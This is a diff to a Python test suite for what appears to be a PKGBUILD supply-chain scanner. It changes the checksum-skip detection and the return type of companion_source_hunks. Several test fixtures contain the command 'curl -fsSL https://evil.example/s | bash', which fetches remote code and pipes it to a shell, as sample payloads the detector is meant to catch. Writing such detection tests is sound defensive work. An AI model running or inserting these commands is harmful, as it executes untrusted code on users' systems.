@@ -193,10 +193,12 @@ def test_detect_checksum_added():
     assert result == "checksum_added_or_changed"
 
 
-def test_detect_checksum_md5_not_flagged():
+def test_detect_checksum_md5_skip_is_flagged():
+    """`md5sums=('SKIP')` disables verification as effectively as
+    `sha256sums=('SKIP')`; reading sha256 alone left it silent."""
     diff = """+md5sums=('SKIP')"""
     result = detect_checksum_changes(diff)
-    assert result == "unchanged"  # only sha256 is checked
+    assert result == "changed_from_sha256_to_skip"
 
 
 def test_detect_checksum_none():
@@ -314,7 +316,7 @@ def test_companion_hunk_carries_the_committed_payload(tmp_path):
         "PKGBUILD": b"source=('setup.sh')\nprepare(){ bash setup.sh; }\n",
         "setup.sh": b"#!/bin/bash\ncurl -fsSL https://evil.example/s | bash\n",
     })
-    hunk = companion_source_hunks(repo, commit)
+    hunk, _cut = companion_source_hunks(repo, commit)
     assert "+++ b/setup.sh" in hunk
     assert "+curl -fsSL https://evil.example/s | bash" in hunk
 
@@ -325,7 +327,7 @@ def test_companion_hunk_ignores_a_file_the_recipe_never_names(tmp_path):
         "PKGBUILD": b"source=('https://x/y.tar.gz')\n",
         "notes.sh": b"curl https://evil.example/s | bash\n",
     })
-    assert companion_source_hunks(repo, commit) == ""
+    assert companion_source_hunks(repo, commit) == ("", False)
 
 
 def test_companion_hunk_reads_an_undeclared_but_executed_file(tmp_path):
@@ -335,7 +337,7 @@ def test_companion_hunk_reads_an_undeclared_but_executed_file(tmp_path):
         "PKGBUILD": b'pkgver=2\npackage(){ bash "${startdir}/helper.sh"; }\n',
         "helper.sh": b"curl -fsSL https://evil.example/s | bash\n",
     })
-    hunk = companion_source_hunks(repo, commit)
+    hunk, _cut = companion_source_hunks(repo, commit)
     assert "+++ b/helper.sh" in hunk
     assert "+curl -fsSL https://evil.example/s | bash" in hunk
 
@@ -346,7 +348,7 @@ def test_companion_hunk_skips_binaries(tmp_path):
         "PKGBUILD": b"source=('blob')\n",
         "blob": b"\x7fELF\x00\x01\x02curl | bash",
     })
-    assert companion_source_hunks(repo, commit) == ""
+    assert companion_source_hunks(repo, commit) == ("", False)
 
 
 def test_companion_hunk_reads_a_payload_committed_earlier(tmp_path):
@@ -366,7 +368,7 @@ def test_companion_hunk_reads_a_payload_committed_earlier(tmp_path):
               repo.create_blob(b"pkgver=2\nsource=('setup.sh')\n"),
               pygit2.GIT_FILEMODE_BLOB)
     c2 = repo.create_commit("HEAD", who, who, "2", b2.write(), [c1])
-    hunk = companion_source_hunks(repo, str(c2))
+    hunk, _cut = companion_source_hunks(repo, str(c2))
     assert "+curl https://evil.example/s | bash" in hunk
 
 
@@ -395,6 +397,6 @@ def test_companion_content_makes_the_rules_fire(tmp_path):
         "setup.sh": b"#!/bin/bash\ncurl -fsSL https://evil.example/s | bash\n",
     })
     diff = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1 +1 @@\n-pkgver=1.0\n+pkgver=1.1\n"
-    scanned = diff.rstrip("\n") + "\n" + companion_source_hunks(repo, commit)
+    scanned = diff.rstrip("\n") + "\n" + companion_source_hunks(repo, commit)[0]
     fact = scan_diff(scanned, config=load_config(), package_name="demo", seen_urls={})
     assert "R001" in {e.rule_id for e in fact.score_breakdown}
